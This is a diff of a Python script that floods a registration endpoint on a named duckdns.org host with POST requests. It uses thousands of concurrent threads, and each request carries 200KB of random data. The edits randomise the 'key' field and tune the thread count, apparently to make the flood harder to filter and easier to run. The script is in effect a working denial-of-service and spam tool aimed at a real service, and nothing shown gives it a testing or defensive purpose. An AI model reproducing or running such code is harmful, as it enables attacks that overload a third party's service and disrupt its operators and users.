@@ -10,8 +10,8 @@ def send_post_request():
     url = "http://proxysystem.duckdns.org/kay%C4%B1tol"
     data = {
         'member': '1',
-        'name': generate_random_data(200 * 1024), 
-        'key': '12345678',
+        'name': generate_random_data(200 * 1024),  # 200KB random letters and digits
+        'key': generate_random_data(8),  # Random 8 character key
         'gun': '30',
         'multi': '0'
     }
@@ -23,7 +23,7 @@ def send_post_request():
     print(f'Status Code: {response.status_code}')
 
 def main():
-    num_threads = 1000000  
+    num_threads = 10000  # Number of threads to use (adjust as necessary)
     with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
         futures = [executor.submit(send_post_request) for _ in range(num_threads)]
         concurrent.futures.wait(futures)
